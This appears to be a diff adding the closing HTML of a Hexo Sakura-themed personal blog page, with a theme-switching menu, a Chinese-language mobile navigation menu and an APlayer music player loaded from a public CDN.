+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <!-- 实现换肤功能 -->
+
+  <div class="skin-menu no-select" id="mainskin" style="position: fixed">
+ <div class="theme-controls row-container">
+  <ul class="menu-list">
+   <li id="white-bg"> <i class="fa fa-television" aria-hidden="true"></i></li>
+   <li id="sakura-bg"> <i class="iconfont icon-sakura"></i></li>
+   <li id="gribs-bg"> <i class="fa fa-slack" aria-hidden="true"></i></li>
+   <li id="KAdots-bg"> <i class="iconfont icon-dots"></i></li>
+   <li id="totem-bg"> <i class="fa fa-optin-monster" aria-hidden="true"></i></li>
+   <li id="pixiv-bg"> <i class="iconfont icon-pixiv"></i></li>
+   <li id="bing-bg"> <i class="iconfont icon-bing"></i></li>
+   <li id="dark-bg"> <i class="fa fa-moon-o" aria-hidden="true"></i></li>
+  </ul>
+ </div>
+</div>
+<canvas id="night-mode-cover"></canvas>
+
+  <div class="changeSkin-gear no-select">
+
+  <div class="keys" id="setbtn"> 
+
+   <span id="open-skinMenu"> 切换主题 | SCHEME TOOL  
+
+     <i class="iconfont icon-gear inline-block rotating"></i> 
+
+   </span>
+
+  </div>
+
+</div>
+
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/avatar.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">Mаксим0xGeekCat</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="https://github.com/0xGeekCat" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/%E6%8A%80%E6%9C%AF/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  技术
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E7%94%9F%E6%B4%BB/">
+                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                  生活
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E8%BD%AC%E8%BD%BD/">
+                  <i class="fa fa-book" aria-hidden="true"></i>
+                  转载
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            书单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/tags/%E5%B7%B2%E8%AF%BB/">
+                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                  已读
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/%E6%9C%AA%E8%AF%BB/">
+                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                  未读
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+            关于
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/about/">
+                  <i class="fa fa-meetup" aria-hidden="true"></i>
+                  我？
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+</body>
+</html>
